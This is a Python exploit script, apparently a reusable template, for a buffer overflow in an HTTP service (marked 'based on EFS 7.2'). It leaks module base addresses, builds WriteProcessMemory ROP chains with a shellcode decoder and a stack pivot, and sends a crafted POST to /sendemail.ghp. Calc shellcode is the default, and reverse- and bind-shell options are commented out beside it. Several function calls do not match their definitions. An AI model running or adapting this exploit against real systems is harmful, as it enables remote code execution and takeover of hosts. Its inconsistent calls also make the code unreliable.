                        if rlist:
                            try:
                                remaining = max_buffer - total_received if max_buffer is not None else recvsize
                                read_size = min(recvsize, remaining)

                                if read_size <= 0:
                                    if debug:
                                        print(f"[✓] Remaining buffer limit reached (0 bytes left).")
                                    break

                                chunk = sock.recv(read_size)

                                if not chunk:
                                    if debug:
                                        print(f"[!] Connection closed by peer. Total received: {total_received} / {hex(total_received)} bytes.")
                                    break

                                chunk_len = len(chunk)
                                resp += chunk
                                total_received += chunk_len
                                if debug:
                                    print(f"[Chunk {chunk_num}] Received {chunk_len} / {hex(chunk_len)} bytes (Total: {total_received} / {hex(total_received)})")
                                if chunk_len < recvsize:
                                    break
                                chunk_num += 1

                            except socket.timeout:
                                if debug:
                                    print(f"[!] Socket recv() timeout.")
                                break
                        else:
                            if debug:
                                print(f"[!] Buffer timeout of {buffer_timeout}s hit. Stopping receive.")
                            break

                    if not keepopen:
                        sock.close()
                    return resp

                # Unbuffered single receive
                else:
                    resp = sock.recv(recvsize)
                    if debug:
                        print(f"[Unbuffered] Received {len(resp)} / {hex(len(resp))} bytes")
                    if not keepopen:
                        sock.close()
                    return resp

            except socket.timeout:
                if debug:
                    print("[!] Socket connection-level timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)

            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)

            except Exception as e:
                if debug:
                    print(f"[!] Error: {e}")
                    traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)

        # Use or create global TCP socket; send without receive
        def sendsocktcp(buffer, sendall=False, keepopen=True, timeout=socktimeout, debug=False):
            global sock
            try:
                # Ensure socket is open and valid
                if not (sock and sock.fileno() != -1):
                    if debug:
                        print("[!] Socket not open, attempting to reopen...")
                    Network.TCP.creategsocktcp(host, port)
                else:
                    if debug:
                        print("[*] Using existing socket.")

                # Apply timeout
                sock.settimeout(timeout)

                # Send data
                if sendall:
                    sock.sendall(buffer)
                    if debug:
                        print(f"[✓] Sent {len(buffer)} / {hex(len(buffer))} bytes using sendall().")
                else:
                    sent = sock.send(buffer)
                    if debug:
                        print(f"[✓] Sent {sent} / {hex(sent)} bytes using send().")

                # Optionally close socket
                if not keepopen:
                    if debug:
                        print("[*] Closing socket as requested.")
                    sock.close()

            except socket.timeout:
                if debug:
                    print(f"[!] Socket send timed out after {timeout} seconds.")
                if not keepopen:
                    sock.close()
                sys.exit(0)

            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)

            except Exception as e:
                if debug:
                    print(f"[!] Error during socket send: {e}")
                    traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)

        # Use or create global TCP socket; receive only
        def recvsocktcp(recvsize=1024, keepopen=True, buffered=False, timeout=socktimeout, debug=False):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    if debug:
                        print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed

                sock.settimeout(timeout)

                if buffered:
                    resp = b""
                    total_received = 0
                    chunk_num = 1
                    while True:
                        try:
                            chunk = sock.recv(recvsize)
                            if not chunk:
                                if debug:
                                    print(f"[!] No more data received. Total: {total_received} bytes.")
                                break
                            resp += chunk
                            chunk_len = len(chunk)
                            total_received += chunk_len
                            if debug:
                                print(f"[Chunk {chunk_num}] Received {chunk_len} bytes (Total: {total_received})")
                            chunk_num += 1
                        except socket.timeout:
                            if debug:
                                print(f"[!] Socket timeout. Final total received: {total_received} bytes.")
                            break
                else:
                    resp = sock.recv(recvsize)
                    if debug:
                        print(f"[Unbuffered] Received {len(resp)} bytes")

                if not keepopen:
                    sock.close()

                return resp

            except socket.timeout:
                if debug:
                    print("[!] Socket timeout.")
                if not keepopen:
                    sock.close()
                sys.exit(0)
            except Exception as e:
                if debug:
                    print(f"[!] Error: {e}")
                    traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)
            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)
        
        def recvsocktcp_readline(keepopen=True, timeout=socktimeout, debug=False):
            global sock
            try:
                # Check if the socket is open, otherwise create a new one
                if not (sock and sock.fileno() != -1):
                    if debug:
                        print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)

                if timeout:
                    sock.settimeout(timeout)

                if debug:
                    print("[*] Waiting to read a line from the socket...")

                # Using makefile() for readline, which handles line buffering
                with sock.makefile('r') as sfile:
                    line = sfile.readline()

                if not line:
                    if debug:
                        print("[!] No data received from readline().")
                    if not keepopen:
                        sock.close()
                    return None

                line_stripped = line.strip()
                if debug:
                    print(f"[✓] Received line: {line_stripped}")

                if not keepopen:
                    sock.close()

                return line_stripped

            except socket.timeout:
                if debug:
                    print("[!] Socket timeout while reading line.")
                if not keepopen:
                    sock.close()
                sys.exit(0)

            except Exception as e:
                if debug:
                    print(f"[!] Error while reading line: {e}")
                    traceback.print_exc()
                if sock:
                    sock.close()
                sys.exit(0)

            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                if sock:
                    sock.close()
                sys.exit(0)
                
        # Regular sendrecv TCP socket
        def sendrecvtcp(host, port, buffer, recv=True, recvsize=1024, buffered=False, timeout=timeout, debug=False):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    if debug:
                        print(f"[*] Connecting to {host}:{port}...")
                    s.connect((host, int(port)))
                    if debug:
                        print(f"[✓] Connected. Sending data...")
                    s.sendall(buffer)

                    if recv:
                        if buffered:
                            response = b""
                            total_received = 0
                            chunk_num = 1
                            while True:
                                try:
                                    chunk = s.recv(recvsize)
                                    if not chunk:
                                        if debug:
                                            print(f"[!] No more data received. Total: {total_received} bytes.")
                                        break
                                    response += chunk
                                    chunk_len = len(chunk)
                                    total_received += chunk_len
                                    if debug:
                                        print(f"[Chunk {chunk_num}] Received {chunk_len} bytes (Total: {total_received})")
                                    chunk_num += 1
                                except socket.timeout:
                                    if debug:
                                        print(f"[!] Timeout reached. Final total received: {total_received} bytes.")
                                    break
                            return response
                        else:
                            response = s.recv(recvsize)
                            if debug:
                                print(f"[✓] Received {len(response)} bytes.")
                            return response
                    else:
                        if debug:
                            print("[*] Send-only mode, no response expected.")
                        return False

            except socket.timeout:
                if debug:
                    print("[!] Socket operation timed out.")
                sys.exit(0)
            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                Helpers.keyboard_interrupt()
            except Exception as e:
                if debug:
                    print(f"[!] Error during send/receive operation: {e}")
                    traceback.print_exc()
                sys.exit(0)     

        # Only sending TCP socket, no receiving
        def sendtcp(host,port,buffer, debug=False):
            try:
                if debug:
                    print("Sending buffer...")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.send(buffer)
                s.close()
            except Exception:
                traceback.print_exc()
                sys.exit(0)
            except KeyboardInterrupt:
                Helpers.keyboard_interrupt() 

        # Flush a given or global TCP socket
        def flushsocktcp(timeout=timeout, chunk_size=1024, socket=False, retries=5, debug=False):
            # Check if the socket is valid and initialized
            if not isinstance(sock, socket.socket):
                raise ValueError("No socket to flush.")
            attempts = 0
            try:
                sock.settimeout(timeout)
                while attempts < retries:
                    # Try to read data from the socket
                    data = sock.recv(chunk_size)
                    if not data:
                        break  # No more data, buffer is flushed
                    # Optionally handle or discard data
                    attempts += 1
                if attempts == retries and debug:
                    print(f"[!] Maximum read attempts ({retries}) reached without completing buffer flush.")
            except socket.timeout:
                if debug:
                    print("Socket timeout reached while flushing buffer.")
            except socket.error as e:
                if debug:
                    print(f"Error while flushing buffer: {e}")

    class UDP:
        def createsockudp(host,port):
            sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockudp.connect((host, port))
            return sockudp

        def sendrecvudp(host, port, buffer, recvsize=1024, debug=False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(timeout)
                start = time.time()
                try:
                    s.sendto(buffer, (host, int(port)))
                    resp = s.recvfrom(recvsize)
                    s.close()
                    end = time.time()
                    elapsed = end - start
                    if debug:
                        print("[*] Time elapsed sending UDP packet: " + str(elapsed))
                    return resp
                except socket.timeout:
                    if debug:
                        print("[!] Connection timed out")
                    sys.exit(0)
            except Exception:
                if debug:
                    traceback.print_exc()
                sys.exit(0)
            except KeyboardInterrupt:
                if debug:
                    print("[!] Operation interrupted by user.")
                Helpers.keyboard_interrupt()

class Payload:
    def fuzz():
        # Lengths
        maxlen = 0x1000
        
        # Offsets
        
        # Building buffer
        buffer = b""
        buffer += b"A" * maxlen

        return buffer

    def poc_leak():
        
        # Lengths
        maxlen = 0x4000
        
        # Building buffer
        buffer = b""
        buffer += b"E" * (maxlen - len(buffer))

        return buffer        

    ### EXAMPLE POC BASED ON EFS 7.2
    def poc_crash(ropskelfunc,ropchainfunc,ropchainscdecoder,ropskelalign,selectedsc):
        # Lengths
        maxlen = 0x1000
        lenropblock = 0x300
        
        # Offsets
        offsetropskel = 0x10
        offsetlanding = 0x7bf
        offsetret = 0xfe8
        
        # Values
        stackpivot = pack("<I", 0x10022877)            # add esp, 0x00001004 ; ret ;
        nopsled = b"\x90" * 0x10
        
        # POC buffer
        pocbuf = b""
        pocbuf += b"A" * offsetropskel                  # Static length
        pocbuf += ropskelfunc                            # Static length
        pocbuf += b"B" * (offsetlanding - len(pocbuf))  # Static length
        pocbuf += ropchainfunc                           # Landing second stackpivot; static length
        pocbuf += ropchainscdecoder                     # Dynamic length
        pocbuf += ropskelalign                          # Static length
        pocbuf += b"C" * (lenropblock - len(ropchainfunc+ropchainscdecoder+ropskelalign))    # Dynamic length
        pocbuf += nopsled                               # Static length
        pocbuf += selectedsc                            # Dynamic length
        pocbuf += b"D" * (offsetret - len(pocbuf))      # Static length
        pocbuf += stackpivot                            # First stackpivot; static length
        
        # Building buffer
        buffer = b"POST /sendemail.ghp HTTP/1.1\r\n\r\n"
        buffer += b"Host: " + host.encode()
        buffer += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
        buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        buffer += b"Accept-Language: en-US,en;q=0.5"
        buffer += b"Accept-Encoding: gzip, deflate"
        buffer += b"Connection: close"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Email=%s&getPassword=1234" % pocbuf
        
        return buffer
   
class Program:
    def parseResponse(response):
        """
        DESCR: Parse a server response and extract the leaked address
        IN: Raw response text in string
        OUT: Extracted hex address
        """
        pattern = b"Address is:"
        address = None
        for line in response.split(b"\n"):
            if line.find(pattern) != -1:
                address = int((line.split(pattern)[-1].strip()),16)
        if not address:
            print("[-] Could not find the address in the response")
            sys.exit()
        return address
        
    def leakmodbaseAddr(module,symbol,offset):
        # Create payload
        paylleak = Payload.poc_leak(symbol)
        # Send EIP/CRASH
        leak = Network.TCP.sendrecvsocktcp(paylleak,1024,1024,False,False,False)
        addr = Program.parseResponse(leak)
        if addr:
            modbase = addr - offset
            print("[+] Address of " + module + "!" + symbol.decode() + " is " + hex(addr))
            print("[+] Baseaddress for module " + module + " is " + str(hex(modbase)))            
            return modbase
        else:
            return False       
    
    def sendFunction(opcode):
        # ADD PROGRAM SPECIFIC CODE HERE
        return

# Main
def main(argv):
    # Set up the argument parser
    parser = argparse.ArgumentParser(description="A script to handle socket operations with optional reverse host and port.")  
    # Required positional arguments (e.g., for host and port)
    parser.add_argument("host", type=str, help="The host address to connect to.")
    parser.add_argument("port", type=int, help="The port to connect to.")
    # Optional arguments for reverse host and port
    parser.add_argument("--revhost", "-rh", type=str, default=None, help="The reverse host address (optional).")
    parser.add_argument("--revport", "-rp",type=int, default=None, help="The reverse port (optional). ")
    # Optional argument for timeout
    parser.add_argument("--timeout", "-t", type=int, default=5, help="Set the timeout for socket operations (default is 5 seconds).")
    # Parse the arguments
    args = parser.parse_args()

    # Globals
    global host, port
    global timeout

    # Vars
    host = args.host
    port = args.port
    revhost = args.revhost
    revport = args.revport

    ### ADD VARS HERE ###
    lenbadscchars = 0x0  
    
    ###############
    ### OFFSETS ###
    ###############
    # Offset to main library
    offsetk32wpm = 0x43b10
    offsetlib_libdll = 0x123
    
    # Libeay specific offsets
    offsetscretaddr = 0x92c0e # Originally 0x92c00, but contains bad char
    offsetwritable = 0xe401c
    
    # Offsets for encoding/decoding shellcode bad chars
    offsetEncoding = 0x44
    offsetDecoding = -offsetEncoding
    
    # ROP offset var initialize
    payloadoffsetsc = 0x0    
    # Offset WriteProcessMemory, VirtualAlloc, etc.    
    ropskeloffsetfunc = 0x0
    # Offset to ROP decoder
    ropdecoderoffseteax = 0x0
    # Align with ROP skeleton
    ropskelalign = 0x0

    ###################################
    ### SHELLCODE CHECKS AND COLORS ###
    ###################################
    print(Colors.BOLD + "[*] SHELLCODE BAD CHAR MAPPING AND ENCODING\n" + Colors.END)
    # Shellcode selection
    # selectedsc = Shellcode.asmrevshellShellcode(revhost,revport)
    # selectedsc = Shellcode.asmbindshellcode(revport)
    # selectedsc = Shellcode.msflocalmsgShellcode()
    selectedsc = Shellcode.asmcalcShellcode()
    # Map badchars and convert shellcode
    encodedsc = Helpers.mapandconvertShellcode(selectedsc,offsetEncoding)

    # Variable and ROP parameter lengths    
    print(Colors.BOLD + "[*] LENGTH BUFFER VARS" + Colors.END)
    lenbadscchars = len(Shellcode.mappedbadscchars)
    lenropskeleton = len(ROP.wpmSkeleton(offsetscretaddr,offsetwritable)*4)
    lenropchainfunc = len(ROP.chainWriteProcessMemory(ropskeloffsetfunc,payloadoffsetsc,ropdecoderoffseteax)*4)
    lenropscdecoder = len(ROP.chainscDecoder(encodedsc,offsetDecoding)*4)
    lenropskelalign = len(ROP.chainropskelAlign(ropskelalign)*4)
    # Define a fixed width for alignment
    label_width = 30
    decimal_width = 6
    print(f"{'[*] Shellcode used':<{label_width}} {len(selectedsc):>{decimal_width}} / {hex(len(selectedsc))}")
    print(f"{'[*] Shellcode badchars':<{label_width}} {lenbadscchars:>{decimal_width}} / {hex(lenbadscchars)}")
    print(f"{'[*] ROP skeleton':<{label_width}} {lenropskeleton:>{decimal_width}} / {hex(lenropskeleton)}")
    print(f"{'[*] ROP chain':<{label_width}} {lenropchainfunc:>{decimal_width}} / {hex(lenropchainfunc)}")
    print(f"{'[*] ROP shellcode decoder':<{label_width}} {lenropscdecoder:>{decimal_width}} / {hex(lenropscdecoder)}")
    print(f"{'[*] ROP skeleton align':<{label_width}} {lenropskelalign:>{decimal_width}} / {hex(lenropskelalign)}")

    try:
        ######################       
        ### LEAK ADDRESSES ###
        ######################
        print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
        leaked = []
                
        # Create socket
        Network.TCP.creategsocktcp(host,port)        
        
        # Kernel32
        module = "Kernel32"
        symbol = b"WriteProcessMemory"
        intk32addr = Program.leakmodbaseAddr(module,symbol,offsetk32wpm)
        intwpmaddr = intk32addr + offsetk32wpm
        leaked.append(intwpmaddr)
        # libdll; example module and symbol
        module = "libdll"
        symbol = b"SomeSymbol"
        intbaselib_libdll = Program.leakmodbaseAddr(module,symbol,offsetlib_libdll)
        leaked.append(intbaselib_libdll)

        # Check base address for bad chars
        for addr in leaked:
            if Helpers.containsBadchars(addr,'upper'):
                print("\n[!] Bad character in address " + hex(addr))
                exit(-1)        
        
        ###########
        ### ROP ###
        ###########
        # Update ROP offset vars based on leaked addresses
        ropskeloffsetfunc = 0x1438                                                                  # K32 offset; first value in ROP skeleton to replace
        payloadoffsetsc = -0xa9f                                                                    # Offset to first character of shellcode
        ropdecoderoffseteax = payloadoffsetsc - 0xc                                                 # Offset to first char of shellcode, minus one (ROP decoder specific)

        # Calculate alignment after decoding shellcode; after decoding, EAX is located at last decoded shellcode badchar
        # Offsets and lengths based on current example payload
        offsetropskel = 0x7bf                                                                       # Offset until begin ROP chains
        lenropblock = 0x300                                                                         # As used in payload; Dynamic ROP chains filled until 0x300 of static length
        ropskelalign = (offsetropskel + lenropblock + Shellcode.mappedbadscchars[-1])               # Offset to ropskel function, calculated on last shellcode badbyte occurence
        
        # Update ROP chains
        ropskelfunc_gadgets = ROP.wpmSkeleton(offsetscretaddr,offsetwritable)
        ropskelfunc = b''.join(pack('<L',_) for _ in ropskelfunc_gadgets)
        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intbaselib_libdll,payloadoffsetsc,ropdecoderoffseteax)
        ropchainwpm = b''.join(pack('<L',_) for _ in ropchainwpm_gadgets)
        ropchainscdecoder_gadgets = ROP.chainscDecoder(intbaselib_libdll,encodedsc,offsetDecoding)
        ropchainscdecoder = b''.join(pack('<L',_) for _ in ropchainscdecoder_gadgets)
        ropchainskelalign_gadgets = ROP.chainropskelAlign(intbaselib_libdll,ropskelalign)
        ropchainskelalign = b''.join(pack('<L',_) for _ in ropchainskelalign_gadgets)

        ### ROP CHECK FOR BADCHARS ###
        # Add all gadgets to chain to check for badchars
        check_badchar_ropchains = [
            ropskelfunc_gadgets,
            ropchainwpm_gadgets,
            ropchainscdecoder_gadgets,
            ropchainskelalign_gadgets,
        ]   
        
        # DEBUG ROP CHAINS
        #for rop in ropchainwpm_gadgets:
        #    print(hex(rop))
        
        # Check ROP for bad characters
        print(Colors.BOLD + "\n[*] CHECKING ROP CHAINS..." + Colors.END)
        for chain in check_badchar_ropchains:
            chainname = [key for key, value in locals().items() if value == chain]
            print("[*] " + chainname[0])
            for rop in chain:
                if Helpers.containsBadchars(rop):
                    print("[!] Bad character in ROP " + hex(rop))
                    exit(-1)
                              
        ###########################################                       
        ### CRASH / EIP OVERWRITE FUNCTION HERE ###
        ###########################################
        print(Colors.BOLD + "\n[*] SENDING CRASH PAYLOAD...\n" + Colors.END)
        # Create socket
        sock = Network.TCP.creategsocktcp(host,port)
        # Send data
        paylCrash = Payload.poc_crash(intbaselib_libdll,ropskelfunc,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
        # Send EIP/CRASH
        Network.TCP.sendrecvsocktcp(paylCrash)
        # Close socket
        sock.close()
    except Exception:
        traceback.print_exc()
        sys.exit(0)
    except KeyboardInterrupt:
        Helpers.keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
